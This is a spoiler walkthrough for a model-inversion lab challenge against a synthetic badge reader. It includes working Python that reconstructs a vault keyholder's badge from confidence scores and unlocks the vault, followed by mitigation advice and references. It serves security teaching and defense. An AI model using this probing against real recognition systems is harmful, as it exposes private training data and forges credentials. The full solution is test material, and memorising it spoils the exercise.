# Ghost Badge — Walkthrough

> ⚠️ SPOILER: this file contains the full solution.

## Scenario recap

Halcyon Labs' lobby reader recognises punch-card badges (8 × 8 cells) with a
small model. Its diagnostic mode is still on and returns the model's
confidence for every badge holder. You have your own badge, which does not
open the vault. Rebuild the vault keyholder's badge from the model's answers
and present it to `POST /unlock`. All badge data is synthetic.

## Recon

```bash
tensorgoat create ghost_badge
curl http://127.0.0.1:8106/
```

- `my_badge.txt`: your own pattern. `reader_notes.md`: how the reader works.
- `GET /` names the holders (`B-01` to `B-08`), says which one is you
  (`your_badge`) and which one holds the vault key (`vault_keyholder`).
- `POST /recognise` accepts **any** 64 numbers between 0 and 1 and returns a
  confidence per holder with four decimals. Budget: 600 queries.
- `POST /unlock` wants 64 zeros and ones and opens if at most 4 cells are
  wrong. It only says open or denied. Guessing is hopeless: a random pattern
  is within 4 cells of the real one with a chance of about 1 in 27 trillion.

Scan your own badge to see the reader at work:

```python
import httpx

URL = "http://127.0.0.1:8106"
info = httpx.get(URL).json()
me, target = info["your_badge"], info["vault_keyholder"]

text = open("my_badge.txt", encoding="utf-8").read()
mine = [int(ch == "#") for line in text.splitlines() for ch in line.strip()]
print(httpx.post(f"{URL}/recognise", json={"pixels": mine}).json())
```

The model is almost certain it is you (confidence about 0.99). Now send a scan
that is not a badge at all, every pixel at 0.5:

```python
gray = [0.5] * 64
print(httpx.post(f"{URL}/recognise", json={"pixels": gray}).json())
```

The confidences are spread over all eight holders. The model is undecided,
which means small changes to the scan will move the numbers. That is the
signal you need.

## Exploitation (step by step, with code snippets)

Ask one question per cell: does the keyholder's confidence go up when this
cell is punched, or when it is blank? Keep every other cell gray, so the
answer is about this cell only.

```python
def invert(holder):
    pattern = []
    for cell in range(64):
        scores = []
        for value in (1.0, 0.0):
            scan = [0.5] * 64
            scan[cell] = value
            out = httpx.post(f"{URL}/recognise", json={"pixels": scan}).json()
            scores.append(out["confidences"][holder])
        pattern.append(int(scores[0] > scores[1]))
    return pattern
```

First test the method where you know the answer, on your own badge:

```python
practice = invert(me)
print(sum(a != b for a, b in zip(practice, mine)), "cells wrong")  # usually 0 or 1
```

It rebuilds your badge almost perfectly from 128 invented scans. Now do the
same for the badge you have never seen, and open the vault:

```python
rebuilt = invert(target)
for row in range(8):
    print("".join("#" if c else "." for c in rebuilt[row * 8 : row * 8 + 8]))
print(httpx.post(f"{URL}/unlock", json={"cells": rebuilt}).json())
```

Both runs together use 256 of the 600 queries.

A trap worth knowing: if you improve one scan step by step and keep the
changes, the confidence soon reaches 1.0000 and stops moving, long before all
cells are settled. That is why every probe above starts again from gray.

## Why this works

The model is a softmax regression. For every holder it keeps one weight per
cell and adds up `weight × pixel` over the scan. Training on scans of a badge
pushes that holder's weights up for the cells that are punched on the badge
and down for the cells that are blank. The weights are, in effect, a blurred
copy of the badge. The model has to store it; that is how it recognises the
badge.

The confidence score is a window onto those weights. Changing one pixel moves
the keyholder's score by exactly that pixel's weight, and the confidence
follows. Reading the direction for all 64 cells gives back the pattern. Nobody
needs access to the model file or to the training data.

This is **model inversion**: using a model's outputs to reconstruct what its
training data looks like. In the best-known demonstration, researchers rebuilt
recognisable face images of people from a face-recognition model, knowing only
the person's name and the confidence values the model returned. The method
there is gradient ascent on the confidence. What you did by hand is the same
idea, one coordinate at a time.

It differs from membership inference (*Who's in the Data?*): there you learned
*whether* a known record was in the training set. Here you recover the content
of a record you did not have.

## Mitigation / Defense

- **Do not expose confidences you do not need.** A door reader has to answer
  "who is this" or "nobody", not eight probabilities with four decimals.
  Return the label only, or a coarse band (rounded to 0.1, say). The original
  research found that rounding already degrades this kind of attack a lot. It
  is not a complete fix: an attacker can look for a scan that sits exactly on
  a rounding boundary, and label-only attacks exist.
- **Switch off diagnostic and debug endpoints in production.** This scenario
  starts with a forgotten diagnostic mode. Keep an inventory of what every
  model endpoint returns, and to whom.
- **Authenticate callers, limit and monitor queries.** A budget alone would
  not have helped here (the attack needs 128 queries), but the queries look
  nothing like normal use: hundreds of near-identical gray scans that differ
  in one cell. Detecting that pattern is realistic.
- **Reject inputs that cannot be real.** A scan that is uniformly gray is not
  a badge. An input-validity check in front of the model removes the
  convenient "undecided" starting point and makes probing harder.
- **Do not let the model be the secret.** If recognising a pattern is enough
  to pass, then everything the model has learned about the pattern is a
  credential. Combine recognition with something the model never sees (a
  cryptographic challenge on the badge, a second factor).
- **Train with differential privacy when the training data is sensitive.** It
  bounds how much any single training record can shape the model, and with it
  how much can be read back. For classes built from one person's data (a
  face, a voice, a badge) expect a real cost in accuracy.

## Real-world references

- Fredrikson, Jha, Ristenpart, "Model Inversion Attacks that Exploit
  Confidence Information and Basic Countermeasures" (ACM CCS 2015):
  <https://doi.org/10.1145/2810103.2813677>
- OWASP Machine Learning Security Top 10, ML03:2023 Model Inversion Attack:
  <https://owasp.org/www-project-machine-learning-security-top-10/docs/ML03_2023-Model_Inversion_Attack.html>
- MITRE ATLAS, technique "Invert AI Model": <https://atlas.mitre.org/>
